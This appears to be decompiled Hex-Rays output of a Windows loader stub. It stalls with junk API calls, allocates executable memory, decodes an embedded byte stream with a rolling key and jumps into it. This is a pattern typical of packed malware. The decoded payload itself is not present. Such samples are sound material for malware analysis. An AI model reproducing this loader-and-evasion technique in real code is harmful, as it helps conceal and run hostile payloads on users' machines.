/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall start(int, int, int, int);
int sub_402297();

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *GetProcessTimes)(HANDLE hProcess, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
// extern LPVOID (__stdcall *MapViewOfFileEx)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);


//----- (0040228E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __stdcall start(int a1, int a2, int a3, int a4)
{
  return sub_402297();
}
// 402294: positive sp value 4 has been found

//----- (00402297) --------------------------------------------------------
int sub_402297()
{
  int v0; // esi
  LPVOID v1; // eax
  _BYTE *v2; // edi
  char *v3; // esi
  int v4; // ecx
  int v5; // edx
  int v6; // ebp
  char v7; // bh
  char *v8; // eax
  DWORD flAllocationType; // [esp+0h] [ebp-Ch]
  unsigned int v11; // [esp+4h] [ebp-8h]
  _BYTE *v12; // [esp+8h] [ebp-4h]
  char *retaddr; // [esp+Ch] [ebp+0h]

  v0 = 0;
  do
  {
    GetProcessTimes(0, (LPFILETIME)9, (LPFILETIME)7, (LPFILETIME)0x17, (LPFILETIME)8);
    v0 += 236;
    v1 = MapViewOfFileEx(0, 0x85D63Fu, 7u, 0xFFF7FCu, 0x522B33u, (LPVOID)0x15);
  }
  while ( v0 < 138331879 && !v1 );
  v2 = VirtualAlloc(0, 0x13FD0u, 0x3000u, 0x40u);
  v3 = retaddr + 263;
  v12 = v2;
  v4 = 482;
  v5 = -1860142853;
  v6 = 0;
  do
  {
    v7 = *v3++ + v5;
    *v2 = v7;
    *v2++ -= 20;
    v11 = v5;
    flAllocationType = v4;
    v8 = (char *)MapViewOfFileEx(0, 0x17u, 0x1Du, 0x13u, 0x1Bu, (LPVOID)9);
    v5 = v11 >> 8;
    if ( (char *)++v6 == v8 + 4 )
    {
      v5 = -1860142853;
      v6 = 0;
    }
    v4 = flAllocationType - 1;
  }
  while ( flAllocationType != 1 );
  return ((int (*)(void))(v12 + 4))();
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
